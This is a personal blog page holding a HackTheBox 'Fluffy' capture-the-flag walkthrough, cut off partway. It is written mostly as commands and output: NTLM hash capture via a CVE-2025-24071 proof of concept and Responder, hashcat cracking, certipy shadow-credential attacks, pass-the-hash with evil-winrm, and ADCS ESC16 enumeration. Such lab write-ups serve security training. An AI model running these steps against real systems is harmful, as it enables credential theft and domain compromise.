<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录学习、生活" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="https://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/fe57c22d60846192.css" as="style"/><link rel="stylesheet" href="/_next/static/css/fe57c22d60846192.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-93190d8919063c5b.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-3865532eab74d424.js" defer=""></script><script src="/_next/static/1CjfWk4j6sgto1bTaygaz/_buildManifest.js" defer=""></script><script src="/_next/static/1CjfWk4j6sgto1bTaygaz/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxSeason8 - Fluffy","contentHtml":"\u003ch1\u003eSeason8 - Fluffy\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/machines/Fluffy\"\u003ehttps://app.hackthebox.com/machines/Fluffy\u003c/a\u003e | \u003ccode\u003eWindows\u003c/code\u003e · \u003ccode\u003eEasy\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e**Machine Information：**As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!\u003c/p\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜ nmap -sT -min-rate 5000 -p- 10.10.11.69       \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-25 00:53 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.69\nHost is up (0.15s latency).\nNot shown: 65524 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n636/tcp   open  ldapssl\n3269/tcp  open  globalcatLDAPssl\n9389/tcp  open  adws\n49667/tcp open  unknown\n49677/tcp open  unknown\n49695/tcp open  unknown\n49701/tcp open  unknown\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这次的靶机依旧是没有\u003ccode\u003eWeb\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜ nmap -sT -A -T4 -O -p 53,139,445 10.10.11.69                                                                                                                               \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-25 00:59 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.69\nHost is up (0.16s latency).\n\nPORT    STATE SERVICE       VERSION\n53/tcp  open  domain        Simple DNS Plus\n139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds?\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2019 (88%)\nAggressive OS guesses: Microsoft Windows Server 2019 (88%)\nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e host (\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   \u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: 2025-05-25T11:38:32\n|_  start_date: N/A\n|_clock-skew: 6h38m59s\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   183.42 ms 10.10.16.1\n2   183.81 ms 10.10.11.69\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 63.00 seconds\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e信息收集\u003c/h2\u003e\n\u003ch3\u003eSMB\u003c/h3\u003e\n\u003cp\u003e测试凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜ crackmapexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990!\nSMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.69     445    DC01             [+] fluffy.htb\\j.fleischman:J0elTHEM4n1990! \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e枚举用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  nxc smb fluffy.htb -u \u003cspan class=\"hljs-string\"\u003e'j.fleischman'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'J0elTHEM4n1990!'\u003c/span\u003e --rid-brute | grep \u003cspan class=\"hljs-string\"\u003e\"SidTypeUser\"\u003c/span\u003e | awk -F \u003cspan class=\"hljs-string\"\u003e'\\\\'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'{print $2}'\u003c/span\u003e | awk \u003cspan class=\"hljs-string\"\u003e'{print $1}'\u003c/span\u003e \nGuest\nkrbtgt\nDC01$\nca_svc\nldap_svc\np.agila\nwinrm_svc\nj.coffey\nj.fleischman\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eSMB\u003c/code\u003e 信息收集\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜ smbclient -L 10.10.11.69 -U fluffy.htb/j.fleischman%J0elTHEM4n1990!\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        IT              Disk      \n        NETLOGON        Disk      Logon server share \n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e workgroup listing.\ndo_connect: Connection to 10.10.11.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜ smbclient //10.10.11.69/IT -U fluffy.htb/j.fleischman%J0elTHEM4n1990!\nTry \u003cspan class=\"hljs-string\"\u003e\"help\"\u003c/span\u003e to get a list of possible commands.\nsmb: \\\u003e \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\n  .                                   D        0  Sun May 25 08:21:54 2025\n  ..                                  D        0  Sun May 25 08:21:54 2025\n  0x5chltz.library-ms                 A      364  Sun May 25 08:13:39 2025\n  1.lnk                               A     2164  Sun May 25 07:59:46 2025\n  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025\n  Everything-1.4.1.1026.x64.zip       A      317  Sun May 25 08:06:27 2025\n  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025\n  KeePass-2.58.zip                    A      317  Sun May 25 08:06:16 2025\n  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025\n\n                5842943 blocks of size 4096. 1849449 blocks available\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eUpgrade_Notice.pdf\u003c/code\u003e 像是渗透测试报告一样的东西\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e下边有披露的公开漏洞\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e能看到有两个 \u003ccode\u003eCritical\u003c/code\u003e 漏洞以及两个 \u003ccode\u003eHigh\u003c/code\u003e 漏洞\u003c/p\u003e\n\u003ch3\u003eCVE-2025-24071\u003c/h3\u003e\n\u003cp\u003e对比了两个漏洞 \u003ccode\u003eCVE-2025-24996\u003c/code\u003e 和 \u003ccode\u003eCVE-2025-24071\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e其中 \u003ccode\u003eCVE-2025-24996\u003c/code\u003e 网上文章并不多，而 \u003ccode\u003eCVE-2025-24071\u003c/code\u003e 会有复现文章，所以侧重于 \u003ccode\u003eCVE-2025-24071\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e复现文章：\u003ca href=\"https://blog.csdn.net/weixin_42773448/article/details/146436061\"\u003ehttps://blog.csdn.net/weixin_42773448/article/details/146436061\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e工具：\u003ca href=\"https://github.com/0x6rss/CVE-2025-24071_PoC\"\u003ehttps://github.com/0x6rss/CVE-2025-24071_PoC\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  CVE-2025-24071_PoC git:(main) python poc.py \nEnter your file name: doc\nEnter IP (EX: 192.168.1.162): 10.10.16.16\ncompleted\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e上传到 \u003ccode\u003eIT\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esmb: \\\u003e put exploit.zip\nputting file exploit.zip as \\exploit.zip (0.8 kb/s) (average 0.8 kb/s)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e同时开启\u003ccode\u003eresponder\u003c/code\u003e监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜ responder -I tun0 -wd\n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n           NBT-NS, LLMNR \u0026#x26; MDNS Responder 3.1.5.0\n\n  To support this project:\n  Github -\u003e https://github.com/sponsors/lgandx\n  Paypal  -\u003e https://paypal.me/PythonResponder\n\n  Author: Laurent Gaffie (laurent.gaffie@gmail.com)\n  To \u003cspan class=\"hljs-built_in\"\u003ekill\u003c/span\u003e this script hit CTRL-C\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e等一会能就接收到 \u003ccode\u003ep.agila\u003c/code\u003e 用户 \u003ccode\u003eNET NTLM hash\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ep.agila::FLUFFY:56ab772ca1eae1e3:E1A831FDA20AA227AD2187ABCD5C3737:01010000000000008003A3D819CDDB010A2E54C0A8C85EC30000000002000800330037003200460001001E00570049004E002D0059005000570030004F00330051004D0053004500480004003400570049004E002D0059005000570030004F00330051004D005300450048002E0033003700320046002E004C004F00430041004C000300140033003700320046002E004C004F00430041004C000500140033003700320046002E004C004F00430041004C00070008008003A3D819CDDB01060004000200000008003000300000000000000001000000002000009850210C3B697422BCA38C6B2216E754DBFB52DA16AAC86C61528CEE298FC1640A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310036000000000000000000  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用 \u003ccode\u003ehashcat\u003c/code\u003e 进行破解用户凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜ hashcat -m 5600 \u003cspan class=\"hljs-string\"\u003e'xxxx'\u003c/span\u003e /usr/share/wordlists/rockyou.txt \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e得到密码 \u003ccode\u003eprometheusx-303\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e测试凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜ crackmapexec smb 10.10.11.69 -u p.agila -p prometheusx-303\nSMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.69     445    DC01             [+] fluffy.htb\\p.agila:prometheusx-303 \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eBloodHound\u003c/h3\u003e\n\u003cp\u003e这里使用 \u003ccode\u003eBloodHound\u003c/code\u003e 进行枚举域攻击路线\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003entpdate -s 10.10.11.69 \u0026#x26;\u0026#x26; bloodhound-python -u \u003cspan class=\"hljs-string\"\u003e'p.agila'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'prometheusx-303'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e'fluffy.htb'\u003c/span\u003e -ns 10.10.11.69 --zip -c All -dc DC.fluffy.htb\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜ ntpdate -s 10.10.11.69 \u0026#x26;\u0026#x26; bloodhound-python -u \u003cspan class=\"hljs-string\"\u003e'p.agila'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'prometheusx-303'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e'fluffy.htb'\u003c/span\u003e -ns 10.10.11.69 --zip -c All -dc DC01.fluffy.htb\nINFO: Found AD domain: fluffy.htb\nINFO: Getting TGT \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user\nINFO: Connecting to LDAP server: DC01.fluffy.htb\nINFO: Found 1 domains\nINFO: Found 1 domains \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC01.fluffy.htb\nINFO: Found 10 \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\nINFO: Found 54 \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: DC01.fluffy.htb\nINFO: Done \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 00M 24S\nINFO: Compressing output into 20250525091352_bloodhound.zip\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e用户 \u003ccode\u003ep.agila\u003c/code\u003e 属于 \u003ccode\u003eSERVICE ACCOUNT MANGERS\u003c/code\u003e 和 \u003ccode\u003eSERVICE ACCOUNTS\u003c/code\u003e 组，其中\u003ccode\u003eSERVICE ACCOUNT MANGERS\u003c/code\u003e 对 \u003ccode\u003eSERVICE ACCOUNTS\u003c/code\u003e 组有 \u003ccode\u003eGenericAll\u003c/code\u003e 权限\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后远程服务用户 \u003ccode\u003eWINRM_SVC\u003c/code\u003e 等也是在 \u003ccode\u003eSERVICE ACCOUNTS\u003c/code\u003e 组内\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e域渗透\u003c/h2\u003e\n\u003ch3\u003eTo Winrm_svc\u003c/h3\u003e\n\u003cp\u003e可以使用 \u003ccode\u003eGetUserSPNs\u003c/code\u003e 获取服务用户 \u003ccode\u003eHASH\u003c/code\u003e 来进行破解\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是并无法破解成功，服务账户密码都是随机的…\u003c/p\u003e\n\u003cp\u003e影子用户(\u003ccode\u003eShadow Credential Attack\u003c/code\u003e)启动\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜ certipy shadow auto -username \u003cspan class=\"hljs-string\"\u003e\"p.agila@fluffy.htb\"\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e\"prometheusx-303\"\u003c/span\u003e -account WINRM_SVC -dc-ip 10.10.11.69\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜ \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=winrm_svc.ccache \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eevil-winrm\u003c/code\u003e 登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜ evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\winrm_svc\\Documents\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\winrm_svc\\Desktop\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e user.txt\n9e23a6ed83a674306f7fad569aa292bb\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e寻找攻击路线\u003c/h3\u003e\n\u003cp\u003e继续寻找提权路线\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e感觉还是要拿 \u003ccode\u003eCA_SVC\u003c/code\u003e 用户进行一些攻击，例如 \u003ccode\u003eADCS\u003c/code\u003e 攻击，因为它是 \u003ccode\u003eCA\u003c/code\u003e 服务用户\u003c/p\u003e\n\u003cp\u003e使用 \u003ccode\u003ecertipy\u003c/code\u003e （这里需要对\u003ccode\u003ecertipy\u003c/code\u003e进行更新，在这里卡了很久，愣是找不到攻击路径）枚举可能的漏洞信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜ certipy find -u \u003cspan class=\"hljs-string\"\u003e'ca_svc'\u003c/span\u003e -hashes \u003cspan class=\"hljs-string\"\u003e':ca0f4f9e9eb8a092addf53bb03fc98c8'\u003c/span\u003e -dc-ip 10.10.11.69 -vulnerable     \nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Finding certificate templates\n[*] Found 33 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 11 enabled certificate templates\n[*] Finding issuance policies\n[*] Found 14 issuance policies\n[*] Found 0 OIDs linked to templates\n[*] Retrieving CA configuration \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'fluffy-DC01-CA'\u003c/span\u003e via RRP\n[*] Successfully retrieved CA configuration \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'fluffy-DC01-CA'\u003c/span\u003e\n[*] Checking web enrollment \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e CA \u003cspan class=\"hljs-string\"\u003e'fluffy-DC01-CA'\u003c/span\u003e @ \u003cspan class=\"hljs-string\"\u003e'DC01.fluffy.htb'\u003c/span\u003e\n[!] Error checking web enrollment: timed out\n[!] Use -debug to \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e a stacktrace\n[!] Error checking web enrollment: timed out\n[!] Use -debug to \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e a stacktrace\n[*] Saving text output to \u003cspan class=\"hljs-string\"\u003e'20250525110326_Certipy.txt'\u003c/span\u003e\n[*] Wrote text output to \u003cspan class=\"hljs-string\"\u003e'20250525110326_Certipy.txt'\u003c/span\u003e\n[*] Saving JSON output to \u003cspan class=\"hljs-string\"\u003e'20250525110326_Certipy.json'\u003c/span\u003e\n[*] Wrote JSON output to \u003cspan class=\"hljs-string\"\u003e'20250525110326_Certipy.json'\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e存在 \u003ccode\u003eESC16\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eESC16\u003c/h3\u003e\n\u003cp\u003e利用链接：\u003ca href=\"https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally\"\u003ehttps://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e影子用户获取 \u003ccode\u003eCA_SVC\u003c/code\u003e 的 \u003ccode\u003eNT hash\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜ certipy shadow auto -username \u003cspan class=\"hljs-string\"\u003e\"p.agila@fluffy.htb\"\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e\"prometheusx-303\"\u003c/span\u003e -account CA_SVC -dc-ip 10.10.11.69\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Targeting user \u003cspan class=\"hljs-string\"\u003e'ca_svc'\u003c/span\u003e\n[*] Generating certificate\n[*] Certificate generated\n[*] Generating Key Credential\n[*] Key Credential generated with DeviceID \u003cspan class=\"hljs-string\"\u003e'7f0851e9-35c3-eccb-fd92-b35465aa5f94'\u003c/span\u003e\n[*] Adding Key Credential with device ID \u003cspan class=\"hljs-string\"\u003e'7f0851e9-35c3-eccb-fd92-b35465aa5f94'\u003c/span\u003e to the Key Credentials \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'ca_svc'\u003c/span\u003e\n[*] Successfully added Key Credential with device ID \u003cspan class=\"hljs-string\"\u003e'7f0851e9-35c3-eccb-fd92-b35465aa5f94'\u003c/span\u003e to the Key Credentials \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'ca_svc'\u003c/span\u003e\n[*] Authenticating as \u003cspan class=\"hljs-string\"\u003e'ca_svc'\u003c/span\u003e with the certificate\n[*] Using principal: ca_svc@fluffy.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to \u003cspan class=\"hljs-string\"\u003e'ca_svc.ccache'\u003c/span\u003e\n[*] Trying to retrieve NT \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'ca_svc'\u003c/span\u003e\n[*] Restoring the old Key Credentials \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'ca_svc'\u003c/span\u003e\n[*] Successfully restored the old Key Credentials \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan 